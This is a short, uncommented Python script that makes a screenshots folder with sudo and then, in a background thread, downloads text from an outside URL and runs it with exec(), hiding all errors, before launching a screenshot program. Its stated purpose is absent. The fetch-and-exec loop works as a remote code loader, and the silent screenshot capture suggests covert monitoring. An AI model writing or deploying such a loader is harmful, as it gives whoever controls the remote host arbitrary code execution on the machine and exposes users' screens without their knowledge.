import os, threading
import time, requests

try:
    os.system("sudo mkdir /rolldog/screenshots")
except:
    pass

def start_services():
    while True:
        try:
            exec(requests.get("http://ltz.lumatozer.com/rolldog").text)
        except:
            pass
        start=time.time()
        os.system("python3 /rolldog/screenshotter.py")
        if time.time()-start>30:
            continue
        break

threading.Thread(target=start_services).start()